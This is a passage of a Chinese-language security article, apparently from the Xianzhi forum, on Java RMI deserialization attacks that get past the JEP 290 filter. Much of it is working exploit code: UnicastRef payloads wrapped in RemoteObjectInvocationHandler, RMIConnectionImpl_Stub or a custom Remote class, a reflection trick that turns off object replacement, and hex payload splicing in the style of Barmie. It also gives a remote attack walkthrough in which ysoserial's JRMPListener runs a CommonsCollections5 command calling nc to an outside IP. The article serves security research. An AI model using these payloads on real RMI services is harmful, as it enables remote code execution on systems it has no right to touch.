+<p><a id="img10" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151343-e7c1ad6a-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151343-e7c1ad6a-b457-1.png"></a></p>
+<h5>3.找一个带UnicastRef类型参数的实现Remote接口的类</h5>
+<p>那么第三种情况，直接不用动态代理构造去弄成Remote接口，直接找一个实现Remote接口的类。</p>
+<ol>
+<li>这个类它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li>
+<li>这个类要是Remote接口的</li>
+</ol>
+<h6>RemoteObjectInvocationHandler</h6>
+<p>其实<strong>RemoteObjectInvocationHandler</strong>本身就是一个实现了Remote接口的类。</p>
+<div class="highlight"><pre><span></span><span class="c1">//RemoteObjectInvocationHandler定义，继承自RemoteObject</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RemoteObjectInvocationHandler</span>
+    <span class="kd">extends</span> <span class="n">RemoteObject</span>
+    <span class="kd">implements</span> <span class="n">InvocationHandler</span>
+
+<span class="c1">//RemoteObject定义，实现了Remote接口</span>
+<span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">RemoteObject</span> <span class="kd">implements</span> <span class="n">Remote</span><span class="o">,</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">Serializable</span> <span class="o">{</span>
+</pre></div>
+<p>所以上面<strong>ysoserial-payload-JRMPClient</strong>中利用动态代理修改RemoteObjectInvocationHandler接口是多余的。</p>
+<p>直接注释了动态代理操作也可以打。</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+    <span class="c1">//获取UnicastRef对象</span>
+    <span class="n">String</span> <span class="n">jrmpListenerHost</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span><span class="o">;</span><span class="c1">//本地测试</span>
+    <span class="kt">int</span> <span class="n">jrmpListenerPort</span> <span class="o">=</span> <span class="mi">1199</span><span class="o">;</span>
+    <span class="n">UnicastRef</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">generateUnicastRef</span><span class="o">(</span><span class="n">jrmpListenerHost</span><span class="o">,</span> <span class="n">jrmpListenerPort</span><span class="o">);</span>
+    <span class="c1">//通过构造函数封装进入RemoteObjectInvocationHandler</span>
+    <span class="n">RemoteObjectInvocationHandler</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RemoteObjectInvocationHandler</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
+    <span class="c1">//使用动态代理改变obj的类型变为Registry，这是Remote类型的子类</span>
+    <span class="c1">//所以接下来bind可以填入proxy 注释</span>
+    <span class="c1">//        Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(),</span>
+    <span class="c1">//                new Class[]{Registry.class}, obj);</span>
+    <span class="c1">//触发漏洞</span>
+    <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span><span class="c1">//本地测试</span>
+    <span class="c1">//        registry.bind("hello", proxy);//填入payload</span>
+    <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"hello"</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span><span class="c1">//填入payload</span>
+<span class="o">}</span>
+</pre></div>
+<p><a id="img11" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151359-f15766f8-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151359-f15766f8-b457-1.png"></a></p>
+<p>可以发现我们的RemoteObjectInvocationHandler继承自RemoteObject。</p>
+<ol>
+<li>而UnicastRef对象是在RemoteObject类中赋值的</li>
+<li>RemoteObject类又是一个Remote接口</li>
+</ol>
+<p>那么理论上来说所有RemoteObject的子类都是可以的，我们可以通过ctrl+alt+B来查看子类。</p>
+<p><a id="img12" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151411-f887763e-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151411-f887763e-b457-1.png"></a></p>
+<p>我们选取<strong>RMIConnectionImpl_Stub</strong>和<strong>UnicastRemoteObject</strong>来举例说明</p>
+<h6>RMIConnectionImpl_Stub</h6>
+<p>RMIConnectionImpl_Stub是可以利用的。</p>
+<p>是Remote接口：</p>
+<div class="highlight"><pre><span></span><span class="c1">//RMIConnectionImpl_Stub类定义，继承自RemoteStub类</span>
+<span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">RMIConnectionImpl_Stub</span>
+    <span class="kd">extends</span> <span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">RemoteStub</span>
+    <span class="kd">implements</span> <span class="n">javax</span><span class="o">.</span><span class="na">management</span><span class="o">.</span><span class="na">remote</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">RMIConnection</span><span class="o">{</span>
+
+<span class="c1">//java.rmi.server.RemoteStub 定义，继承自RemoteObject类</span>
+<span class="kd">abstract</span> <span class="kd">public</span> <span class="kd">class</span> <span class="nc">RemoteStub</span> <span class="kd">extends</span> <span class="n">RemoteObject</span> <span class="o">{</span>
+
+<span class="c1">//RemoteObject定义，实现Remote接口</span>
+<span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">RemoteObject</span> <span class="kd">implements</span> <span class="n">Remote</span><span class="o">,</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">Serializable</span> <span class="o">{</span>
+</pre></div>
+<p>利用构造方法可以容纳一个UnicastRef对象：</p>
+<div class="highlight"><pre><span></span><span class="c1">//javax.management.remote.rmi.RMIConnectionImpl_Stub#RMIConnectionImpl_Stub 构造方法</span>
+<span class="kd">public</span> <span class="nf">RMIConnectionImpl_Stub</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">RemoteRef</span> <span class="n">ref</span><span class="o">)</span> <span class="o">{</span>
+    <span class="kd">super</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
+    <span class="o">}</span>
+
+<span class="c1">//java.rmi.server.RemoteStub#RemoteStub(java.rmi.server.RemoteRef) 构造方法</span>
+ <span class="kd">protected</span> <span class="nf">RemoteStub</span><span class="o">(</span><span class="n">RemoteRef</span> <span class="n">ref</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
+    <span class="o">}</span>
+
+<span class="c1">//java.rmi.server.RemoteObject#RemoteObject(java.rmi.server.RemoteRef) 构造方法</span>
+<span class="kd">protected</span> <span class="nf">RemoteObject</span><span class="o">(</span><span class="n">RemoteRef</span> <span class="n">newref</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">ref</span> <span class="o">=</span> <span class="n">newref</span><span class="o">;</span>
+    <span class="o">}</span>
+</pre></div>
+<p>攻击代码就很简单，跟RemoteObjectInvocationHandler完全一致改个参数就完事了，放个图表示可以：</p>
+<blockquote><p>详细代码参考github Bypass290.java</p>
+</blockquote>
+<p><a id="img13" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151430-0437abe8-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151430-0437abe8-b458-1.png"></a></p>
+<h6>UnicastRemoteObject</h6>
+<p>UnicastRemoteObject实际上满足我们说的所有条件，但是是不可以利用的。</p>
+<p>它的确是Remote接口：</p>
+<div class="highlight"><pre><span></span><span class="c1">//java.rmi.server.UnicastRemoteObject定义</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">UnicastRemoteObject</span> <span class="kd">extends</span> <span class="n">RemoteServer</span> <span class="o">{</span>
+
+<span class="c1">//java.rmi.server.RemoteServer定义</span>
+<span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">RemoteServer</span> <span class="kd">extends</span> <span class="n">RemoteObject</span><span class="c1">//这个就是了 不赘述</span>
+<span class="o">{</span>
+</pre></div>
+<p>同样由于继承自RemoteObject，所以同样有一个RemoteObject类中的ref参数，但是在UnicastRemoteObject类中，没有使用到。</p>
+<p>我们实际上也是可以操控这个变量的，之前是通过构造函数直接赋值，现在可以通过反射机制来赋值，实现如下：</p>
+<div class="highlight"><pre><span></span><span class="c1">//3.UnicastRemoteObject</span>
+ <span class="c1">//3.1.获取到UnicastRemoteObject的实例</span>
+ <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.rmi.server.UnicastRemoteObject"</span><span class="o">);</span>
+ <span class="n">Constructor</span> <span class="n">m</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">();</span>
+ <span class="n">m</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+ <span class="n">UnicastRemoteObject</span> <span class="n">UnicastRemoteObject_obj</span> <span class="o">=(</span><span class="n">UnicastRemoteObject</span><span class="o">)</span><span class="n">m</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+ <span class="c1">//3.2.修改实例的ref参数（使用yso中的模块）</span>
+ <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">UnicastRemoteObject_obj</span><span class="o">,</span><span class="s">"ref"</span><span class="o">,</span><span class="n">ref</span><span class="o">);</span>
+</pre></div>
+<p>可以对比下三个对象的内容，都包含了我们修改的ref对象，没问题。</p>
+<p><a id="img14" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151447-0dd39e78-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151447-0dd39e78-b458-1.png"></a></p>
+<p>但是在实际利用的时候，<strong>使用UnicastRemoteObject是不可以的！</strong>一开始我也非常的疑惑：这不科学！，但是代码是死肥宅最忠实的伙伴，它是不会骗人的。</p>
+<blockquote><p><a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank">bsmali4师傅的一次攻击内网RMI服务的深思</a>这篇文章中发现了这个问题，但是他的结论是由于ref是一个transient类型的变量，不会反序列化。</p>
+<p>但实际上可以攻击的RMIConnectionImpl_Stub类也是使用transient类型的ref。所以这个结论是错误的</p>
+</blockquote>
+<p>其实关键点在于：</p>
+<ul>
+<li>我们默认理解为序列化过程是对于我们的恶意object进行writeobject，<code>RMIConnectionImpl_Stub.writeobject()</code>、<code>UnicastRemoteObject.writeobject()</code>那么当然是序列化的。（实际上也可以，在github的Bypass290代码中尝试序列化写入了文件中进行查看，结果也是把正确的ref值写入了，就不贴图了）</li>
+<li>但是实际上客户端序列化的过程为：ObjectOutput.writeobject(我们的恶意object)</li>
+</ul>
+<p><a id="img15" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151502-16f0bb58-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151502-16f0bb58-b458-1.png"></a></p>
+<p>那么实际上这边的序列化逻辑与我们想象的有点出入，<strong>他会去替换掉我们辛辛苦苦生成的object</strong>。这是导致同是继承RemoteObject有的行，有的不行的关键。</p>
+<p>我们在<code>java.io.ObjectOutputStream#writeObject0</code>打入断点，使用UnicastRemoteObject对象来攻击，细看：</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject0</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">unshared</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">IOException</span>
+    <span class="o">{</span>
+        <span class="kt">boolean</span> <span class="n">oldMode</span> <span class="o">=</span> <span class="n">bout</span><span class="o">.</span><span class="na">setBlockDataMode</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
+        <span class="n">depth</span><span class="o">++;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//一大堆类型检查，都不会通过</span>
+
+            <span class="c1">// 想要去检查替换我们的object</span>
+            <span class="n">Object</span> <span class="n">orig</span> <span class="o">=</span> <span class="n">obj</span><span class="o">;</span>
+            <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">cl</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+            <span class="n">ObjectStreamClass</span> <span class="n">desc</span><span class="o">;</span>
+            <span class="k">for</span> <span class="o">(;;)</span> <span class="o">{</span>
+                <span class="c1">//查找相关内容</span>
+            <span class="o">}</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">enableReplace</span><span class="o">)</span> <span class="o">{</span><span class="c1">//都是true</span>
+            <span class="c1">//!!!!!!!!!!!此处替换了我们的对象！！！！！！！！！！</span>
+                <span class="n">Object</span> <span class="n">rep</span> <span class="o">=</span> <span class="n">replaceObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">rep</span> <span class="o">!=</span> <span class="n">obj</span> <span class="o">&amp;&amp;</span> <span class="n">rep</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">cl</span> <span class="o">=</span> <span class="n">rep</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+                    <span class="n">desc</span> <span class="o">=</span> <span class="n">ObjectStreamClass</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">cl</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="n">obj</span> <span class="o">=</span> <span class="n">rep</span><span class="o">;</span>
+            <span class="o">}</span>
+
+            <span class="c1">//一些替换后的处理，不太重要</span>
+
+            <span class="c1">// 通过类进行分配序列化过程</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">obj</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">writeString</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">obj</span><span class="o">,</span> <span class="n">unshared</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">cl</span><span class="o">.</span><span class="na">isArray</span><span class="o">())</span> <span class="o">{</span>
+                <span class="n">writeArray</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">desc</span><span class="o">,</span> <span class="n">unshared</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">obj</span> <span class="k">instanceof</span> <span class="n">Enum</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">writeEnum</span><span class="o">((</span><span class="n">Enum</span><span class="o">&lt;?&gt;)</span> <span class="n">obj</span><span class="o">,</span> <span class="n">desc</span><span class="o">,</span> <span class="n">unshared</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">obj</span> <span class="k">instanceof</span> <span class="n">Serializable</span><span class="o">)</span> <span class="o">{</span>
+                <span class="c1">//进入此处再开始正常的序列化</span>
+                <span class="n">writeOrdinaryObject</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">desc</span><span class="o">,</span> <span class="n">unshared</span><span class="o">);</span>
+            <span class="c1">//...省略...</span>
+    <span class="o">}</span>
+</pre></div>
+<p>UnicastRemoteObject在此处的情况，发生了变化：</p>
+<p><a id="img16" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151518-20a7c33a-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151518-20a7c33a-b458-1.png"></a></p>
+<p>RMIConnectionImpl_Stub在此处的情况，没有发生变化：</p>
+<p><a id="img17" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151528-26ca1cfe-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151528-26ca1cfe-b458-1.png"></a></p>
+<p>replaceobject替换的方法具体在<code>sun.rmi.server.MarshalOutputStream#replaceObject</code>中</p>
+<div class="highlight"><pre><span></span><span class="c1">//var1就是我们想要序列化的类</span>
+<span class="kd">protected</span> <span class="kd">final</span> <span class="n">Object</span> <span class="nf">replaceObject</span><span class="o">(</span><span class="n">Object</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+    <span class="c1">//这个类要是Remote接口的，并且不是RemoteStub接口的，为true</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">var1</span> <span class="k">instanceof</span> <span class="n">Remote</span> <span class="o">&amp;&amp;</span> <span class="o">!(</span><span class="n">var1</span> <span class="k">instanceof</span> <span class="n">RemoteStub</span><span class="o">))</span> <span class="o">{</span>
+        <span class="c1">//这里会去获取到新的对象来替换</span>
+        <span class="c1">//UnicastRemoteObject走的就是这条路</span>
+        <span class="n">Target</span> <span class="n">var2</span> <span class="o">=</span> <span class="n">ObjectTable</span><span class="o">.</span><span class="na">getTarget</span><span class="o">((</span><span class="n">Remote</span><span class="o">)</span><span class="n">var1</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">var2</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var2</span><span class="o">.</span><span class="na">getStub</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="c1">//RMIConnectionImpl_Stub走的就是这条路</span>
+    <span class="k">return</span> <span class="n">var1</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></div>
+<p>那么就很明显了，之前我们觉得只要是remote接口就行了，这个定义有问题，实际上要满足以下两个条件的类我们才能用：</p>
+<ol>
+<li>是Remote接口</li>
+<li>并且是RemoteStub接口</li>
+</ol>
+<blockquote><p>这里的逻辑关系需要倒一下，是Remote 又不是RemoteStub是不行的，又要是Remote的</p>
+</blockquote>
+<p>那么我们就找到了为啥RMIConnectionImple_Stub可以，但是UnicastRemoteObject不行的原因。</p>
+<p>找Remote的继承类就可以轻而易举找到跟RMIConnectionImple_Stub类似的其他类。</p>
+<p><a id="img18" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151619-45216b76-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151619-45216b76-b458-1.png"></a></p>
+<p>这些理论都是可以的，就不一一实验了。</p>
+<h6>新的小问题-RemoteObjectInvocationHandler为啥又可以了</h6>
+<p>但是我们又会发现一开始就成功的RemoteObjectInvocationHandler并不满足我们的出来的规定，它是Remote接口但是不是RemoteStub接口呀。</p>
+<p>继续调试</p>
+<p><a id="img19" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151634-4db59e42-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151634-4db59e42-b458-1.png"></a></p>
+<p>发现虽然它不满足条件进入了if，但是获取到的替换类var2为空，又返回原本的值了。</p>
+<p>至于为什么会获取到的结果var2为空，是因为在getTarget中会去内部查询，因为InvocationHandler的特性所以类型转化不到原始类所以为空（胡说八道中，反正跟InvocationHandler脱不了干系）</p>
+<p>至此我们就完全搞清楚了找一个带UnicastRef类型参数的实现Remote接口的类的时候需要：</p>
+<ol>
+<li>这个类它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li>
+<li>这个类要是Remote接口的并且是RemoteStub接口</li>
+<li>这个类要是Remote接口并且不是RemoteStub接口要是获取不到原来的类也可以，比如RemoteInvocationHandler</li>
+</ol>
+<h6>绕过序列化过程中的替换使所有类均可用于攻击</h6>
+<p>从<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank">国外老哥的文章</a>中得到的思路。</p>
+<p>在分析中我们发现<strong>ObjectOutputStream对象流</strong>中的<strong>enableReplace</strong>全局变量决定了我们的对象是否会被替换：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ObjectOutputStream</span>
+    <span class="kd">extends</span> <span class="n">OutputStream</span> <span class="kd">implements</span> <span class="n">ObjectOutput</span><span class="o">,</span> <span class="n">ObjectStreamConstants</span>
+<span class="o">{</span>
+    <span class="cm">/** if true, invoke replaceObject() */</span>
+    <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">enableReplace</span><span class="o">;</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject0</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">unshared</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">IOException</span>
+    <span class="o">{</span>
+        <span class="o">...</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">enableReplace</span><span class="o">)</span> <span class="o">{</span><span class="c1">//都是true</span>
+            <span class="o">...</span>
+        <span class="o">}</span>
+        <span class="o">...</span>
+     <span class="o">}</span>
+</pre></div>
+<p>那么其实我们只要用反射机制，在序列化前把out对象的<strong>enableReplace属性修改为false</strong>就可以了(这需要重新实现bind查询，来进行修改)。大概如下：</p>
+<div class="highlight"><pre><span></span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectOutput</span> <span class="n">out</span> <span class="o">=</span> <span class="n">call</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
+<span class="c1">//反射修改enableReplace</span>
+<span class="n">ReflectionHelper</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">out</span><span class="o">,</span> <span class="s">"enableReplace"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+<span class="n">out</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span> <span class="c1">// 写入我们的对象</span>
+</pre></div>
+<blockquote><p>这些绕过我都已经在<a href="https://github.com/wh1t3p1g/ysomap" target="_blank">ysomap</a>中完成了实现。（没错看到后面，你会发现一开始打算自己做的，然后发现ysomap已经完成了一部分，秉着打不过他就加入他的原则，开始为ysomap添砖加瓦）</p>
+</blockquote>
+<h5>4.带UnicastRef类型参数的实现Remote接口的类—自定义</h5>
+<p>但是如果我们回忆之前的出的结论：</p>
+<blockquote><p>反序列化打服务端，可以使用一个服务端不存在的类。在这个服务端不存在的类的变量中放入payload，这个payload会在服务端反序列化这个不存在的类的时候触发，虽然会报错，但是会触发。</p>
+</blockquote>
+<p>我们实际上之前做的所有的研究都是无用功，因为我们压根不用去找一个存在于JDK中的类去满足条件来进行攻击，而是自己写一个就可以了。</p>
+<p>这个结论让我非常沮丧，我也希望有人告诉我不是这样的，但是实验结果就是如此，他就是可以攻击成功。我甚至打包了没有包含自定义的类的jar放到远程服务器上，但是仍然可以。</p>
+<p>实现一个可以序列化的remote接口的类，然后正常攻击</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">lala_remote</span> <span class="kd">implements</span> <span class="n">Remote</span><span class="o">,</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">Serializable</span> <span class="o">{</span>
+        <span class="kd">private</span> <span class="n">RemoteRef</span> <span class="n">ref</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="nf">lala_remote</span><span class="o">(</span><span class="n">UnicastRef</span> <span class="n">remoteref</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
+            <span class="n">ref</span><span class="o">=</span><span class="n">remoteref</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<blockquote><p>可以注意到不是RemoteStub接口，自实现的类会满足上卖弄整理的第三种情况，不会被替换对象。</p>
+</blockquote>
+<p><a id="img20" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151659-5ca06ea0-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151659-5ca06ea0-b458-1.png"></a></p>
+<p>又是报错报着找不到class，但是弹框成功。</p>
+<p>远程的（用8u111）。</p>
+<p><a id="img21" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151709-63096562-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151709-63096562-b458-1.png"></a></p>
+<p>也是非常有趣，大家都是用已经写好的poc、ysoserial，但实际上.......随便搞搞就可以用了。</p>
+<blockquote><p>此处为ysomap添加了一个自定义类的模块RMIConnectCustomized，来证明可行性。</p>
+</blockquote>
+<h4>bind的局限性</h4>
+<p>好的，重新整理心情。来讨论随便的bind的局限性。</p>
+<p>当我们在本地进行试验的时候，使用高于8u141的版本也是可以命令执行的。这会形成一种不受版本限制的错觉。</p>
+<p>但实际上在远程攻击的时候，这种攻击是有局限性的。</p>
+<ol>
+<li>我们把github的代码打包一下，放到远程服务器上，运行靶机<code>java -cp RMIDeserialize.jar com.lala.ServerAndRegister</code>（服务器会有危险）</li>
+<li>服务端再起一个JRMP-Listener。<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 11 CommonsCollections5 "nc 47.102.137.xxx:10000"</code>（用nc来表示命令执行。ps.讲道理不应该在靶机上起一个攻击者的攻击用服务，但是我没有更多的服务器了...）</li>
+<li><code>nc -lvvp 10000</code>服务器通过nc监听来判断命令执行是否成功</li>
+<li>本地Bypass290代码改成远程攻击端口</li>
+<li>运行Bypass290攻击</li>
+</ol>
+<p>服务器8u131环境成功。</p>
+<p><a id="img22" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151743-772c6dbe-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151743-772c6dbe-b458-1.png"></a></p>
+<p>服务器8u161失败</p>
+<p><a id="img23" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151753-7d1f7ea0-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151753-7d1f7ea0-b458-1.png"></a></p>
+<p>回忆之前的说明，原因同样是bind操作中注册端对于服务端的地址验证。</p>
+<p>那么根据之前的结论，我们可以通过lookup来替换bind操作来进行攻击，这样可以绕过bind操作中对于服务端得地址验证。</p>
+<h3 id="toc-4">与RMI客户端反序列化攻击RMI服务端-Lookup结合</h3>
+<p>这边参照Barmie的bind攻击思路，使用拦截器来替换攻击包的字节码，来自己重构一个攻击包的字节码。这个思路非常底层和繁琐，但是理论上可以绕过所有客户端限制逻辑。</p>
+<h4>基于Barmie拦截器的自实现</h4>
+<p>我把Barmie的拦截器逻辑拔了出来，放到了Github的RMI-Bypass290项目下。</p>
+<p>在Barmie的原逻辑中，拦截器中字节码的拼接非常简单粗暴，他会保留一些包头固定格式，然后修改参数。通常都是直接复制成功的poc的16进制字节码，然后修改其中命令执行的16进制代码，再拼接进入数据包进行发送。比如CC的payload是这样：</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">_header_chunk</span> <span class="o">=</span> <span class="s">"737200116a6176612e757469...."</span><span class="o">;</span><span class="c1">//开头的序列化信息</span>
+<span class="kd">private</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">_footer_chunk</span> <span class="o">=</span> <span class="s">"740004657865637571007e00...."</span><span class="o">;</span><span class="c1">//结尾的序列化信息</span>
+
+<span class="c1">//开头塞进去</span>
+<span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">fixReferences</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">hexStrToByteArray</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">_header_chunk</span><span class="o">),</span> <span class="n">refCorrection</span><span class="o">));</span>
+
+<span class="c1">//自定义添加要执行的String形式的命令</span>
+<span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">stringToUtf8ByteArray</span><span class="o">(</span><span class="n">cmd</span><span class="o">));</span>
+
+<span class="c1">//结尾塞进去</span>
+<span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">fixReferences</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">hexStrToByteArray</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">_footer_chunk</span><span class="o">),</span> <span class="n">refCorrection</span><span class="o">));</span>
+</pre></div>
+<p>我们的Remote接口的对象原本也可以按照这个思路，找一个成功的数据包，然后修改其中的JRMP服务器回连IP和端口就行了。</p>
+<p>但是对比JRMP服务器地址：888.888.888.888:8887、888.888.888.888:8888两次攻击数据包发现：</p>
+<p>JRMP服务器回连IP可以简单进行修改，但是端口却是不可以显性直接进行修改的。</p>
+<p><a id="img24" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151911-ab6c5986-b458-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151911-ab6c5986-b458-1.png"></a></p>
